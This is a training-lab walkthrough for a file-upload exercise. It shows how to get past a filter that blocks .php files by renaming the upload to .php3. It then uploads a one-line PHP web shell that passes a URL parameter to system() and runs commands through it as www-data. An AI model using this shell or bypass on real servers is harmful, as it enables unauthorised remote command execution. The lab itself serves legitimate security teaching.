File Upload 02

In this second example, the developer put a restriction on the file name. 
The file name cannot end with .php. To bypass this restriction, you can simply rename the file to .php3 for example (since the server will load file with this extension as PHP file).

To finish this exercise, you need to run the binary (/usr/local/bin/score) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as first argument:

/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8

 You can access this exercise using the following URL: .http://ptc-2abe030f-0c0127da.libcurl.so/ 

 
Common Mistakes:

  *  Make sure you replace the full netcat command with the score command followed by your UUID: /usr/local/bin/score ....

    Steps:
             1) Visit the given URL: http://ptc-2abe030f-0c0127da.libcurl.so/.
             2) First make the .php file with the code but saved as test.php3
                        <?php
                             system($_GET['c']);
                        ?>
             3) Browse the file and upload.
             4) Upload doneYour file can be found here. Click 'here'
                And we'll be redirected to: http://ptc-2abe030f-0c0127da.libcurl.so/upload/test.php3
             5) As we know we put 'c; in command so let's make the parameter as:
                    http://ptc-2abe030f-0c0127da.libcurl.so/upload/test.php3?c=id
                    ----> uid=33(www-data) gid=33(www-data) groups=33(www-data) 
             6) Then, let's use  (/usr/local/bin/score) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as first argument:
                    /usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8

                http://ptc-2abe030f-0c0127da.libcurl.so/upload/test.php3?c=/usr/local/bin/score%20dd19b1aa-7a48-4881-87ce-4fd3f96516f8
             7)  Bravo!!  Congrats you have finished this exercise! 

            Happy Hacking!! :) 